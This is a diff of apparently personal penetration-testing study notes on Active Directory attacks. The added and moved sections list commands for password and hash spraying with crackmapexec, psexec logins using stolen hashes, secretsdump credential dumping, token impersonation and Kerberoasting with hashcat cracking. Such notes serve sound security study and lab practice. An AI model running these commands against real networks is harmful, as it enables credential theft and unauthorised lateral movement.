@@ -77,6 +77,20 @@ Transfer loot back to kali:
 15. `Get-NetGPO` (show group policy)
 16.  `Get-NetLoggedon -ComputerName <current Computer name>  `(Find,Currently Logged on Users: their credentials will be saved in memory so find out logged in highvalue target or lateral movement)
 17.   `Get-NetSession -ComputerName dc01` (to verfify that domain controller is logged into what other pc)
+18.   
+## Pass the Password Attack 
+1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. Would be great if we could get to DC straight away but usually, we wont. 
+2. `crackmapexec smb 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
+3. `psexec DOMAIN/username:SOMEPASSWORD@TARGETIP ` to login if sucessful
+## Pass the Hash or crack(gained from local SAM)
+1. `impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip <DC IP>`
+2. or `secretsdump.py marvel/ID:SOMEPASSWORD@TARGETIP` 
+3. `crackmapexec smb 192.168.57.0/24 -u "Frank Admin" -H <Second part of the HASH without ::> --local-auth` (we are trying to login to other computers)
+4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":TARGETIP -hashes avbcd:abcd`. If dont get a shell, we werent able to gain admin access. 
+
+## Token Impersonation
+0. If we navigate to a machine and token of a domain administrator(user), we have domain admin. 
+
 
 ## Kerbreroasting (Service Account Attack (want to attack members of high value group )
 1. Once we have some username + password, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
@@ -85,10 +99,7 @@ impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -reque
 [save hash and crack with hashcat]
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-## Pass the Password Attack
-1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. 
-2. `crackmapexec 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
-3. `psexec DOMAIN/username:SOMEPASSWORD@TARGETIP ` to login if sucessful
+
 ## Dump the hash 
 1. We have a user account and pssexed into an account. We want to dump hashes.
 2. `secretsdump.py Domain/USERNAME:SOMEPASSWORD@TargetIP`
